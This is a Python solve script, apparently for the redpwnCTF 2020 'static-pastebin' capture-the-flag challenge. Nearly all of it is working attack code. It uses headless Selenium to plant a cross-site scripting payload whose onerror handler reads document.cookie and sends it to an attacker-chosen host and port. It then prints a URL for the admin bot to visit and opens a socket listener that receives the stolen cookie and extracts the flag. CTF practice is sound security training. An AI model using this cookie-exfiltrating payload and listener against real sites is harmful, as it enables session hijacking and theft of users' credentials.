import argparse
import re
import socket

from selenium.webdriver import Firefox
from selenium.webdriver.firefox.options import Options


# Command line arguments
parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="Hostname or IP Address to listen on")
parser.add_argument("lport", type=int, help="Port to listen on")
args = parser.parse_args()

# selenium options
opts = Options()
opts.headless = True
driver = Firefox(options=opts)

try:

    # Submit payload and store resultant malicious URL
    driver.get("https://static-pastebin.2020.redpwnc.tf/")
    textarea = driver.find_element_by_id("text")
    textarea.clear()
    payload = f'><img src="xx" onerror="let x= document.cookie;window.location.href = \'http://{args.lhost}:{args.lport}?cookie=\'+x;">'
    textarea.send_keys(payload)

    button = driver.find_element_by_id("button")
    button.click()

    malicious_url: str = driver.current_url

finally:
    driver.quit()

# Submit malicious URL to admin page manually
admin_url = "https://admin-bot.redpwnc.tf/submit?challenge=static-pastebin"
print(f"[*] Visit {admin_url} and paste this following URL into the dialog box: {malicious_url}")

# Listen for connection from admin with flag as cookie
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", args.lport))
s.listen(5)
client_socket, client_address = s.accept()
response: bytes = client_socket.recv(1024)
response: str = response.decode()

# Extract the flag
regex = r"flag{(.+)}"
result = re.search(regex, response)
assert result, "[!] Couldn't find flag in response from static pastebin admin"
flag: str = result.group(0)
print(f"[*] Got the flag: {flag}")
